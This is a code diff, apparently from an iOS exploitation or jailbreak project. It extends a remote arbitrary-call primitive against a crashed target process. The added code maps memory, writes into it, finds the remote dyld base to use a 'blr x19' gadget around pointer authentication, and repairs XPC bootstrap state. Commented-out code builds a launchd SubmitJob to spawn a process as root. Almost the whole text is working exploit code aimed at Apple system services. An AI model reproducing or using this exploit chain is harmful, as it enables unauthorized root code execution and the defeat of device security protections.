@@ -29,7 +29,7 @@
             [self changePtrTapped];
         }],
         [UIAction actionWithTitle:@"Test spawn root process" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
-            launchTest();
+            launchTest(@"dtsecurity");
         }]
     ]]];
     self.navigationItem.rightBarButtonItems = @[
@@ -49,7 +49,6 @@
     
     self.exceptionPort = setup_exception_server();
     self.childPid = -1;
-    //self.sleepPid = spawn_sleep_process();
 }
 
 - (void)redirectStdio {
@@ -117,13 +116,36 @@
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         //RemoteArbCall(atexit, 0x41414100);
-        
+//        RemoteArbCall(sleep, 1);
+//        printf("----- DONE FUNCTION 1 -----\n");
+//        RemoteArbCall(sleep, 1);
+//        printf("----- DONE FUNCTION 2 -----\n");
+//        RemoteArbCall(dlopen, 0x4141414199);
+//        printf("----- DONE FUNCTION 3 -----\n");
         vm_address_t map = RemoteArbCall(mmap, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         printf("Mapped memory at 0x%lx\n", map);
         
         // Test mkdir
         RemoteWriteString(map, "/tmp/.it_works");
         RemoteArbCall(mkdir, map, 0700);
+        
+        // Get remote dyld base for blr x19
+        mach_port_t remote_task = (mach_port_t)RemoteArbCall(task_self_trap);
+        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
+        kern_return_t kr = (kern_return_t)RemoteArbCall(task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
+        if (kr != KERN_SUCCESS) {
+            printf("task_info failed\n");
+            return;
+        }
+        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
+        vm_address_t remote_dyld_base;
+        do {
+            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
+            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
+            // FIXME: why do I have to sleep a bit for dyld base to be available?
+            usleep(100000);
+        } while (remote_dyld_base == 0);
+        blrX19Address = remote_dyld_base + blrX19Offset;
         
         // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
         RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
@@ -137,40 +159,42 @@
         printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
         RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
         
-        printf("Waiting 5 seconds before detach...\n");
-        sleep(5);
-        RemoteDetach();
-        
-        /*
         // Now we can submit a launch job
-        vm_address_t root = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
-        vm_address_t submitJob = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
-        
-        RemoteWriteString(map, "LaunchOnlyOnce");
-        RemoteArbCall(xpc_dictionary_set_bool, submitJob, map, true);
-        RemoteWriteString(map, "ExitTimeOut");
-        RemoteArbCall(xpc_dictionary_set_int64, submitJob, map, 30);
-        RemoteWriteString(map, "POSIXSpawnType");
-        RemoteWriteString(map+0x100, "Interactive");
-        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
-        RemoteWriteString(map, "Label");
-        RemoteWriteString(map+0x100, "com.apple.dt.instruments.dtsecurity.haxx");
-        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
-        RemoteWriteString(map, "Program");
-        RemoteWriteString(map+0x100, "/System/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/XPCServices/com.apple.dt.instruments.dtsecurity.xpc/com.apple.dt.instruments.dtsecurity");
-        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
-        
-        RemoteWriteString(map, "SubmitJob");
-        
-        printf("Waiting 5 seconds before xpc_dictionary_set_value...\n");
-        sleep(5);
-        RemoteArbCall(xpc_dictionary_set_value, root, map, submitJob);
-        
-        //RemoteArbCall(xpc_release, submitJob);
-        
-        printf("Submitting launch job...\n");
-        RemoteArbCall(_launch_msg2, root, 3, 0);
-        */
+//        vm_address_t root = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
+//        vm_address_t submitJob = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
+//        
+//        RemoteWriteString(map, "LaunchOnlyOnce");
+//        RemoteArbCall(xpc_dictionary_set_bool, submitJob, map, true);
+//        RemoteWriteString(map, "ExitTimeOut");
+//        RemoteArbCall(xpc_dictionary_set_int64, submitJob, map, 30);
+//        RemoteWriteString(map, "POSIXSpawnType");
+//        RemoteWriteString(map+0x100, "Interactive");
+//        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
+//        RemoteWriteString(map, "Label");
+//        RemoteWriteString(map+0x100, "com.apple.dt.instruments.dtsecurity.haxx");
+//        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
+//        RemoteWriteString(map, "Program");
+//        //RemoteWriteString(map+0x100, "/System/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/XPCServices/com.apple.dt.instruments.dtsecurity.xpc/com.apple.dt.instruments.dtsecurity");
+//        RemoteWriteString(map+0x100, "/Applications/PreBoard.app/PreBoard");
+//        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
+//        
+//        //xpc_dictionary_set_bool(simService, "ResetAtClose", true);
+//        
+//        RemoteWriteString(map, "SubmitJob");
+//        
+//        // xpc_dictionary_set_value validates PAC of lr, so use blr x19 to call it
+//        RemoteArbCallBLR(xpc_dictionary_set_value, root, map, submitJob);
+//        
+//        RemoteArbCall(xpc_release, submitJob);
+//        
+//        printf("Waiting 5 seconds before _launch_msg2...\n");
+//        sleep(5);
+//        printf("Submitting launch job...\n");
+//        //RemoteArbCall(_launch_job_routine, 0x3e8, root, ???, 0);
+//        
+//        printf("Waiting 5 seconds before detach...\n");
+//        sleep(5);
+//        RemoteDetach();
         
         //RemoteArbCall(munmap, map, 0x4000);
         
